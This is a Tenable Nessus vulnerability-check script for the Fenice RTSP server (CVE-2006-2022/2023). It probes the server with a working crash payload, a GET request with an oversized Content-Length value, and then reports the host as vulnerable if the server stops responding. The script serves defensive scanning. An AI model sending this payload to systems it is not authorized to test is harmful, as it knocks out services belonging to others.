#
# (C) Tenable Network Security, Inc.
#


include("compat.inc");

if (description)
{
  script_id(21610);
  script_version("$Revision: 1.8 $");

  script_cve_id("CVE-2006-2022", "CVE-2006-2023");
  script_bugtraq_id(17678);
  script_xref(name:"OSVDB", value:"24881");
  script_xref(name:"OSVDB", value:"24882");

  script_name(english:"Fenice <= 1.10 Multiple Remote Vulnerabilities");
  script_summary(english:"Tries to crash Fenice using large Content-Length");
 
 script_set_attribute(attribute:"synopsis", value:
"The remote RTSP server suffers from multiple overflow issues." );
 script_set_attribute(attribute:"description", value:
"The remote host is running Fenice, an open-source media streaming
server for Linux / unix. 

The version of Fenice installed on the remote host is affected by an
integer overflow vulnerability involving requests with large values
for the 'Content-Length' header and by a buffer overflow vulnerability
in its 'parse_url' function.  An unauthenticated remote attacker can
exploit either flaw using a simple GET request to crash the affected
application and possibly to execute arbitrary code subject to the
privileges of the user id under which Fenice runs." );
 script_set_attribute(attribute:"see_also", value:"http://www.securityfocus.com/archive/1/431870/30/0/threaded" );
 script_set_attribute(attribute:"see_also", value:"http://www.securityfocus.com/archive/1/436256/30/0/threaded" );
 script_set_attribute(attribute:"solution", value:
"Upgrade to Fenice version 1.11 or later." );
 script_set_attribute(attribute:"cvss_vector", value: "CVSS2#AV:N/AC:L/Au:N/C:P/I:P/A:P" );
script_end_attributes();


  script_category(ACT_DENIAL);
  script_family(english:"Gain a shell remotely");
  script_copyright(english:"This script is Copyright (C) 2006-2009 Tenable Network Security, Inc.");
  script_dependencies("find_service2.nasl");
  script_require_ports("Services/rtsp", 554);

  exit(0);
}


port = get_kb_item("Services/rstp");
if (!port) port = 554;
if (!get_port_state(port)) exit(0);


# Try to crash it.
soc = open_sock_tcp(port);
if (!soc) exit(0);

req = 'GET / HTTP/1.0\r\nContent-Length: 4294967295\r\n\r\n';
send(socket:soc, data:req);
close(soc);


# There's a problem if the server's now down.
#
# nb: the server doesn't crash immediately.
sleep(2);

soc2 = open_sock_tcp(port);
if (soc2) close(soc2);
else security_hole(port);
